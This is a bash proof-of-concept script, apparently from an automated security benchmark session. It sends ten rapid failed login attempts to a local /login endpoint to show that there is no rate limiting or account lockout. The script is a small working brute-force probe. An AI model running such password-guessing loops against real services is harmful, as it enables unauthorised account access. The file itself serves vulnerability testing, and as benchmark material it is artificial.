#!/bin/bash
# POC: Demonstrates missing brute force protection on login endpoint - sends 10 rapid failed login attempts and verifies no rate limiting (429 responses) or account lockout occurs
# Target: ./repo
# Created: 2025-11-10T18:29:33.934Z
# Session: benchmark-XBEN-007-24-mhtgyyde

# Brute Force Protection POC - Login Endpoint
# This POC demonstrates the absence of rate limiting and brute force protection
# on the /login endpoint by sending rapid failed login attempts

TARGET_URL="http://localhost:5003/login"
USERNAME="brutetest"
ATTEMPT_COUNT=10
SUCCESS_COUNT=0
RATE_LIMIT_COUNT=0

echo "=========================================="
echo "Brute Force Protection Test - Login Endpoint"
echo "=========================================="
echo "Target: $TARGET_URL"
echo "Username: $USERNAME"
echo "Attempting $ATTEMPT_COUNT rapid login requests..."
echo ""

# Array to store response codes
declare -a RESPONSE_CODES
declare -a RESPONSE_BODIES

# Send rapid login attempts
for i in $(seq 1 $ATTEMPT_COUNT); do
    PASSWORD="password${i}"
    
    # Send request and capture response code and body
    RESPONSE=$(curl -s -w "\n%{http_code}" -X POST "$TARGET_URL" \
        -H "Content-Type: application/json" \
        -d "{\"username\":\"$USERNAME\",\"password\":\"$PASSWORD\"}")
    
    # Extract response code (last line) and body (all but last line)
    HTTP_CODE=$(echo "$RESPONSE" | tail -n 1)
    BODY=$(echo "$RESPONSE" | sed '$d')
    
    RESPONSE_CODES[$i]=$HTTP_CODE
    RESPONSE_BODIES[$i]="$BODY"
    
    echo "Attempt $i: HTTP $HTTP_CODE"
    
    # Check for rate limiting response
    if [ "$HTTP_CODE" == "429" ]; then
        RATE_LIMIT_COUNT=$((RATE_LIMIT_COUNT + 1))
        echo "  ✓ Rate limited (429)"
    elif [ "$HTTP_CODE" == "401" ] || [ "$HTTP_CODE" == "403" ]; then
        SUCCESS_COUNT=$((SUCCESS_COUNT + 1))
        echo "  ✗ Unauthorized but no rate limit"
    fi
    
    # Small delay to still be "rapid" but not overwhelm
    sleep 0.1
done

echo ""
echo "=========================================="
echo "Results Summary:"
echo "=========================================="
echo "Total Attempts: $ATTEMPT_COUNT"
echo "Successful Responses (401/403): $SUCCESS_COUNT"
echo "Rate Limited Responses (429): $RATE_LIMIT_COUNT"
echo ""

# Check for vulnerability
if [ $RATE_LIMIT_COUNT -eq 0 ] && [ $SUCCESS_COUNT -eq $ATTEMPT_COUNT ]; then
    echo "✗ VULNERABLE: No rate limiting detected!"
    echo "  - All $ATTEMPT_COUNT attempts were accepted"
    echo "  - No 429 (Too Many Requests) responses"
    echo "  - Brute force attack is possible"
    exit 0
elif [ $RATE_LIMIT_COUNT -gt 0 ]; then
    echo "✓ PROTECTED: Rate limiting is in place"
    echo "  - $RATE_LIMIT_COUNT responses were rate limited (429)"
    exit 1
else
    echo "? UNCLEAR: Mixed responses detected"
    exit 1
fi